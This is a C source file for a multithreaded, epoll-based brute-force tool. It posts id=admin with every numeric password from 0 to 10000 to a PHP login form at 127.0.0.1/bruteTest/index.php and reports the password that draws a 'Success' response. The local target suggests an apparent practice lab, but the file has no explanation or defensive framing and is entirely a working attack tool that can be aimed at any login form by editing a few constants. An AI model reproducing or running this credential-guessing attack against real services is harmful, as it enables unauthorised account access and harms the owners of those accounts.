#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <errno.h>

#define IP		"127.0.0.1"
#define PORT	80

#define MAX_HTTP_SIZE	3000
#define MIN_PASSWORD	0
#define MAX_PASSWORD	10000

#define EPOLL_SIZE		100

#define TRUE 1
#define FALSE 0

typedef int BOOL;

void * process_request(void * arg);
void * process_response(void * arg);
void setnonblockingmode(int fd);

pthread_mutex_t mutex;
struct epoll_event *ep_events;
struct epoll_event event;
int epfd, event_cnt;
int fd_cnt = 0;
int store[22222];
BOOL request_finish = FALSE;

int main(int argc, char *argv[])
{	
	pthread_t req_thread, res_thread;

	setnonblockingmode(1);
	setnonblockingmode(2);
	
	epfd = epoll_create(EPOLL_SIZE);
	ep_events = (struct epoll_event*) malloc(sizeof(struct epoll_event)*EPOLL_SIZE);
	
	pthread_mutex_init(&mutex, NULL);
	
	pthread_create(&req_thread, NULL, process_request, NULL);
	pthread_create(&res_thread, NULL, process_response, NULL);

	pthread_join(req_thread, NULL);
	pthread_mutex_lock(&mutex);
	request_finish = TRUE;
	pthread_mutex_unlock(&mutex);
	pthread_join(res_thread, NULL);
	
	printf("[*] Brute Fail!\n");

	close(epfd);
	free(ep_events);
	pthread_mutex_destroy(&mutex);

	return 0;
}

void * process_request(void * arg)
{
	int sock;
	struct sockaddr_in serv_addr;
	char http_cmn[MAX_HTTP_SIZE];
	char http_send[MAX_HTTP_SIZE];
	int pw;
	
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(IP);
	serv_addr.sin_port = htons(PORT);
	
	strcpy(http_cmn,"POST /bruteTest/index.php HTTP/1.1 \r\n");
	strcat(http_cmn,"Host: 127.0.0.1 \r\n");
	strcat(http_cmn,"Content-Type: application/x-www-form-urlencoded \r\n");
	strcat(http_cmn,"Content-Length: 100 \r\n");
	strcat(http_cmn,"\r\n");
	strcat(http_cmn,"id=admin&pw=");

	for(pw=MIN_PASSWORD; pw<=MAX_PASSWORD; ++pw)
	{
		printf("[*] Trying %d...\n",pw);
		
		while((sock=socket(PF_INET, SOCK_STREAM, 0)) == -1) {
			fprintf(stderr, "socket() error!!\n");
		}

		while(connect(sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) == -1) {
			fprintf(stderr, "connect() error!!\n");
		}

		setnonblockingmode(sock);
		
		sprintf(http_send, "%s%d", http_cmn, pw);
		send(sock, http_send, strlen(http_send), 0);
		shutdown(sock, SHUT_WR);

		event.events = EPOLLIN;
		event.data.fd = sock;
		pthread_mutex_lock(&mutex);
		if(epoll_ctl(epfd, EPOLL_CTL_ADD, sock, &event) != 0) {
			fprintf(stderr, "epoll_ctl() error!!\n");
			close(sock);
			--pw;
		}
		++fd_cnt;
		store[sock] = pw;
		pthread_mutex_unlock(&mutex);
	}

	return NULL;
}

void * process_response(void * arg)
{
	int sock;
	char http_recv[MAX_HTTP_SIZE];
	int recv_sz;
	int i;
	
	while(1)
	{
		pthread_mutex_lock(&mutex);
		if(request_finish && fd_cnt <= 0) {
			pthread_mutex_unlock(&mutex);
			break;
		}
		event_cnt = epoll_wait(epfd, ep_events, EPOLL_SIZE, 0);
		pthread_mutex_unlock(&mutex);

		for(i=0; i<event_cnt; ++i) {
			sock = ep_events[i].data.fd;
			while(1) {
				recv_sz=recv(sock, http_recv, MAX_HTTP_SIZE-1, 0);
				if(recv_sz == 0) {
					break;
				}
				else if(recv_sz < 0) {
					if(errno == EAGAIN)
						break;
					else
						fprintf(stderr,"recv return -1!!\n");
				}
				else {
					http_recv[recv_sz] = '\0';
					if(strstr(http_recv,"Success")) {
						pthread_mutex_lock(&mutex);
						printf("[*] Found!\n[*] Password is %d\n", store[sock]);
						epoll_ctl(epfd, EPOLL_CTL_DEL, sock, NULL);
						--fd_cnt;
						pthread_mutex_unlock(&mutex);
						close(sock);
						exit(1);
					}
				}
			}
			pthread_mutex_lock(&mutex);
			printf("[*] Trying %d... finished!\n", store[sock]);
			epoll_ctl(epfd, EPOLL_CTL_DEL, sock, NULL);
			--fd_cnt;
			pthread_mutex_unlock(&mutex);
			close(sock);
		}
	}

	return NULL;
}

void setnonblockingmode(int fd)
{
	int flag = fcntl(fd, F_GETFL, 0);
	fcntl(fd, F_SETFL, flag | O_NONBLOCK);
}
